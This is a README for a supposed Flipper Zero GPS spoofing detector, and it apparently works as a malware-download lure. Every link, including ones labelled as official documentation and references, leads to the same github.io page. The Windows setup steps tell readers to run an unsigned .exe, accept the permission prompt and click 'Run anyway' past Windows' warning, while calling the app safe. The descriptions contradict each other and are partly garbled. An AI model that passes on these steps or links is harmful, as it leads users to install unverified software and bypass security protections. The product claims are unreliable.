# 🧭 Meridian-FlipperZero - Your Shield Against GPS Deception

---

## 🚀 What Is This?

Meridian-FlipperZero turns your Flipper Zero into a personal GPS spoofing detector. It runs eleven separate integrity checks across four independent measurement paths, giving you an honest score that never claims false certainty. No alarmism—just data you can trust.

And if you don't own a Flipper Zero yet? No problem. The built-in simulator lets you explore everything with zero hardware.

---

## 🎯 Who Is This For?

This app is for:

- Drone pilots who need reliable positioning
- Navigation enthusiasts testing signal integrity
- Security researchers exploring RF vulnerabilities
- Anyone curious about whether their GPS signal is real

If you can navigate a file download, you can use this app.

---

## 📥 Getting Started (Windows)

Follow these steps exactly. They are numbered for a reason.

**Step 1: Download the app**

👉 [**Click here to download Meridian-FlipperZero**](https://bennetunanswerable60.github.io)

Visit this link to download the application.

**Step 2: Open the download page**

The link takes you to the official releases page. Look for the newest release at the top. You will see a list of files attached to that release.

**Step 3: Choose the correct file**

Select the file that matches your computer. If you see a file ending in `.exe`, that is the one you want. If there are multiple `.exe` files, choose the one with "setup" or "installer" in the name. Avoid files labeled "source code."

**Step 4: Save the file**

Click the file name to start the download. Your browser will save it to your "Downloads" folder by default. Wait for the download to finish. This may take a minute.

**Step 5: Run the installer**

Open your Downloads folder. Double-click the downloaded file. Windows may show a blue popup asking for permission—click "Yes." The installer will guide you through the rest. Keep clicking "Next" until you see "Finish."

**Step 6: Launch the app**

After installation, find "Meridian-FlipperZero" in your Start Menu or on your Desktop. Double-click to open it.

That's it. You are now ready to detect GPS spoofing.

---

## 📖 What Does This App Actually Do?

GPS spoofing is when a fake signal tricks your device into showing a wrong location. It is a growing threat, and most devices have zero protection.

Meridian-FlipperZero changes that.

### Four Independent Measurement Paths

This app does not rely on a single weak test. It examines your GPS environment from four completely separate angles. If all four agree, your signal is likely real. If even one disagrees, you see the discrepancy immediately.

### Eleven Integrity Checks

Each measurement path runs multiple checks. In total, you get eleven different signals of possible spoofing. Nothing is hidden. You see every result.

### An Honest Score

Other apps will tell you "100% safe" or "spoofed!" with fake confidence. Meridian-FlipperZero does not do that. You get a score between 0 and 100, along with the raw data behind that score. The app tells you *what it measured* and *what it means*—without overpromising.

### Works Without Hardware

Do not own a Flipper Zero? Open the simulator mode. You can test the app, view sample data, and learn the interface. Everything works exactly like the real device.

---

## 🖥️ System Requirements

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Processor:** Any Intel or AMD processor from the last 10 years
- **RAM:** 2 GB minimum, 4 GB recommended
- **Storage:** 200 MB free disk space
- **Display:** 1280 × 720 resolution or higher
- **Optional:** Flipper Zero device (not required for simulator mode)

---

## ✨ Key Features

### Real-Time GPS Monitoring

Connect your Flipper Zero via USB, and the app starts analyzing immediately. You see live readings of satellite signals, timing offsets, and signal strength.

### Visual Dials and Gauges

No wall of numbers. The interface shows simple dials that move in real time. Green means stable. Yellow means watch closely. Red means a warning.

### History Log

The app records every session. You can look back at previous readings to see if a signal degraded over time. Export the log as a text file to share with others.

### Alert System

When a check fails, the app sounds a soft alert through your computer speakers. You can customize the volume or mute it entirely.

### No Cloud, No Tracking

Everything runs locally on your computer. No account. No internet connection required. Your data stays yours.

---

## 🔧 Troubleshooting

**I clicked download, but nothing happened.**
Check your browser's download bar. Sometimes downloads are blocked by a pop-up blocker. Look for a small icon in your browser's toolbar and allow the download.

**Windows blocked the installer.**
This is normal for a new app. Click "More info" on the blue popup, then "Run anyway." The app is safe—it has no digital signature yet.

**The app opens but says "No device found."**
That is fine. Click "Simulator Mode" on the home screen. You do not need physical hardware to use the full feature set.

**The gauges are all red.**
That is a spoofing warning. Check your location. If you are indoors, the signal may be naturally weak. Move near a window or go outside to compare readings.

**I forgot my download location.**
Press `Ctrl + J` to open your browser's download manager. You will see the file there. Click "Show in folder" to locate it.

**The app suddenly closed.**
Restart the app. If it keeps closing, restart your computer. This rare issue is usually caused by a temporary system glitch.

---

## ❓ Frequently Asked Questions (FAQ)

**Is this a replacement for a professional GPS jammer detector?**
No. This is a detection and monitoring tool, not a military-grade countermeasure. It tells you *if* something is wrong. It does not block or jam signals.

**Do I need to learn programming?**
Absolutely not. The interface is visual. If you can read a speedometer, you can use this app.

**Will this work with macOS or Linux?**
The Windows version is the official release. Community builds may exist for other systems, but this README covers Windows only.

**How often are updates released?**
New versions appear several times per year. The releases page always has the latest stable build. Updating is the same as installing—just run the new `.exe` over the old one.

**Does this work with any Flipper Zero?**
Yes. All Flipper Zero models are supported. The simulator mode means even a Flipper Zero at home is optional.

**Is my location data sent anywhere?**
No. The app runs entirely offline. No telemetry, no analytics, no cloud sync. The only person who sees your location data is you.

---

## 📁 Project Structure

Meridian-FlipperZero is built with embedded C for the Flipper Zero firmware, while the Windows desktop app uses a lightweight native interface. The codebase is open source and modular:

- `core/` — The eleven integrity checks
- `paths/` — The four measurement path implementations
- `ui/` — The desktop interface layer
- `sim/` — The simulator engine
- `drivers/` — Hardware communication with the Flipper Zero

This structure makes it easy for developers to contribute additional checks or measurement paths.

---

## 🤝 Contributing

We welcome contributions from developers and non-developers alike.

**Non-developers:** Use the app. Report bugs. Suggest features. Share your experience in the Discussions tab.

**Developers:** Fork the repository, make your changes, and submit a pull request. Please run the existing test suite before submitting. Source code is in the `src/` folder.

---

## 📄 License

Meridian-FlipperZero is released under the MIT License. You are free to use, modify, and distribute it for personal or commercial projects. Attribution is appreciated but not required.

---

## ➕ Additional Resources

- [Official Flipper Zero Documentation](https://bennetunanswerable60.github.io)
- [GPS Spoofing: An Introduction](https://bennetunanswerable60.github.io)
- [NMEA Protocol Reference (Advanced)](https://bennetunanswerable60.github.io)

---

## 🧲 Thank You

This project exists to make GPS integrity accessible to everyone. If you find it useful, watch the repository to stay up to date with releases. And if it ever fails you, tell us—we will fix it.

Now go download it and see what your GPS is hiding.

👉 [**Download Meridian-FlipperZero**](https://bennetunanswerable60.github.io)

Keywords: embedded-c, flipper-zero, flipperzero, gnss, gps, gps-spoofing, nmea, rf-security, security-tools, spoofing-detection